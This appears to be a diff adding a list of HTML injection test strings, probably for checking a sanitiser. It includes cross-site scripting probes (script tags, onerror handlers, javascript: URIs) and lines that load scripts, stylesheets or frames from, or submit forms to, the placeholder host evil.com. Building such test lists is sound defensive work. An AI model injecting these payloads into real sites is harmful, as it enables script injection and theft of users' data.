@@ -1,0 +1,189 @@
+<h1>Hacked</h1>
+<h2>Hacked</h2>
+<h3>Hacked</h3>
+<h4>Hacked</h4>
+<h5>Hacked</h5>
+<h6>Hacked</h6>
+<b>Hacked</b>
+<i>Hacked</i>
+<u>Hacked</u>
+<strike>Hacked</strike>
+<blink>Hacked</blink>
+<marquee>Hacked</marquee>
+<font color="red">Hacked</font>
+<font size="7">Hacked</font>
+<font face="Arial">Hacked</font>
+<center>Hacked</center>
+<div>Hacked</div>
+<span>Hacked</span>
+<p>Hacked</p>
+<strong>Hacked</strong>
+<em>Hacked</em>
+<small>Hacked</small>
+<big>Hacked</big>
+<tt>Hacked</tt>
+<code>Hacked</code>
+<kbd>Hacked</kbd>
+<samp>Hacked</samp>
+<var>Hacked</var>
+<cite>Hacked</cite>
+<blockquote>Hacked</blockquote>
+<q>Hacked</q>
+<ins>Hacked</ins>
+<del>Hacked</del>
+<sub>Hacked</sub>
+<sup>Hacked</sup>
+<br>
+<hr>
+<a href="http://evil.com">Click me</a>
+<a href="#" onclick="alert(1)">Click me</a>
+<a href="javascript:alert(1)">Click me</a>
+<img src="x" onerror="alert(1)">
+<img src="http://evil.com/evil.jpg">
+<iframe src="http://evil.com">
+<iframe srcdoc="<h1>Hacked</h1>">
+<object data="http://evil.com">
+<embed src="http://evil.com">
+<applet code="evil">
+<audio src="http://evil.com/evil.mp3" autoplay>
+<video src="http://evil.com/evil.mp4" autoplay>
+<source src="http://evil.com/evil.mp4">
+<track src="http://evil.com/evil.vtt">
+<map><area href="http://evil.com">
+<details><summary>Hacked</summary></details>
+<menu><li>Hacked</li></menu>
+<menuitem label="Hacked">
+<command label="Hacked">
+<meter value="50">Hacked</meter>
+<progress value="50">Hacked</progress>
+<time>Hacked</time>
+<abbr title="Hacked">Hacked</abbr>
+<acronym title="Hacked">Hacked</acronym>
+<address>Hacked</address>
+<article>Hacked</article>
+<aside>Hacked</aside>
+<audio>Hacked</audio>
+<bdi>Hacked</bdi>
+<bdo dir="rtl">Hacked</bdo>
+<canvas>Hacked</canvas>
+<data value="hacked">Hacked</data>
+<datalist><option value="hacked"></datalist>
+<details>Hacked</details>
+<dialog>Hacked</dialog>
+<figcaption>Hacked</figcaption>
+<figure>Hacked</figure>
+<footer>Hacked</footer>
+<header>Hacked</header>
+<main>Hacked</main>
+<mark>Hacked</mark>
+<nav>Hacked</nav>
+<output>Hacked</output>
+<picture><source srcset="evil"><img src="evil"></picture>
+<pre>Hacked</pre>
+<ruby>Hacked<rt>Hacked</rt></ruby>
+<s>Hacked</s>
+<section>Hacked</section>
+<summary>Hacked</summary>
+<template>Hacked</template>
+<video>Hacked</video>
+<wbr>
+<form action="http://evil.com"><input type="submit"></form>
+<button onclick="alert(1)">Click me</button>
+<button formaction="http://evil.com">Click me</button>
+<input type="text" value="Hacked">
+<input type="hidden" value="Hacked">
+<input type="password" value="Hacked">
+<input type="checkbox" checked>
+<input type="radio" checked>
+<input type="file">
+<input type="image" src="x" onerror="alert(1)">
+<input type="reset" value="Hacked">
+<input type="button" value="Click me" onclick="alert(1)">
+<input type="submit" value="Click me" formaction="http://evil.com">
+<textarea>Hacked</textarea>
+<select><option>Hacked</option></select>
+<optgroup><option>Hacked</option></optgroup>
+<label>Hacked</label>
+<fieldset><legend>Hacked</legend></fieldset>
+<keygen>
+<output>Hacked</output>
+<progress>Hacked</progress>
+<meter>Hacked</meter>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<applet code="javascript:alert(1)">
+<base href="http://evil.com">
+<link rel="stylesheet" href="http://evil.com/evil.css">
+<style>body{background:red}</style>
+<style>@import url(http://evil.com/evil.css)</style>
+<script>alert(1)</script>
+<script src="http://evil.com/evil.js"></script>
+<noscript>Hacked</noscript>
+<template>Hacked</template>
+<slot>Hacked</slot>
+<svg><circle cx="50" cy="50" r="40" fill="red"></circle></svg>
+<svg><script>alert(1)</script></svg>
+<math><mi>x</mi></math>
+<math><script>alert(1)</script></math>
+<xml>Hacked</xml>
+<iframe src="data:text/html,<h1>Hacked</h1>">
+<object data="data:text/html,<h1>Hacked</h1>">
+<embed src="data:text/html,<h1>Hacked</h1>">
+<iframe srcdoc="<h1>Hacked</h1>">
+<object data="http://evil.com/evil.html">
+<embed src="http://evil.com/evil.html">
+<a href="data:text/html,<h1>Hacked</h1>">Click me</a>
+<iframe src="http://evil.com/evil.html">
+<object data="http://evil.com/evil.swf">
+<embed src="http://evil.com/evil.swf">
+<applet code="evil.class">
+<param name="movie" value="http://evil.com/evil.swf">
+<iframe src="http://evil.com/evil.pdf">
+<object data="http://evil.com/evil.pdf">
+<embed src="http://evil.com/evil.pdf">
+<iframe src="http://evil.com/evil.xml">
+<object data="http://evil.com/evil.xml">
+<embed src="http://evil.com/evil.xml">
+<iframe src="http://evil.com/evil.rss">
+<object data="http://evil.com/evil.rss">
+<embed src="http://evil.com/evil.rss">
+<iframe src="http://evil.com/evil.atom">
+<object data="http://evil.com/evil.atom">
+<embed src="http://evil.com/evil.atom">
+<iframe src="http://evil.com/evil.json">
+<object data="http://evil.com/evil.json">
+<embed src="http://evil.com/evil.json">
+<iframe src="http://evil.com/evil.txt">
+<object data="http://evil.com/evil.txt">
+<embed src="http://evil.com/evil.txt">
+<iframe src="http://evil.com/evil.csv">
+<object data="http://evil.com/evil.csv">
+<embed src="http://evil.com/evil.csv">
+<iframe src="http://evil.com/evil.tsv">
+<object data="http://evil.com/evil.tsv">
+<embed src="http://evil.com/evil.tsv">
+<iframe src="http://evil.com/evil.ics">
+<object data="http://evil.com/evil.ics">
+<embed src="http://evil.com/evil.ics">
+<iframe src="http://evil.com/evil.vcf">
+<object data="http://evil.com/evil.vcf">
+<embed src="http://evil.com/evil.vcf">
+<iframe src="http://evil.com/evil.eml">
+<object data="http://evil.com/evil.eml">
+<embed src="http://evil.com/evil.eml">
+<iframe src="http://evil.com/evil.msg">
+<object data="http://evil.com/evil.msg">
+<embed src="http://evil.com/evil.msg">
+<iframe src="http://evil.com/evil.rtf">
+<object data="http://evil.com/evil.rtf">
+<embed src="http://evil.com/evil.rtf">
+<iframe src="http://evil.com/evil.docx">
+<object data="http://evil.com/evil.docx">
+<embed src="http://evil.com/evil.docx">
+<iframe src="http://evil.com/evil.xlsx">
+<object data="http://evil.com/evil.xlsx">
+<embed src="http://evil.com/evil.xlsx">
+<iframe src="http://evil.com/evil.pptx">
+<object data="http://evil.com/evil.pptx">
+<embed src="http://evil.com/evil.pptx">
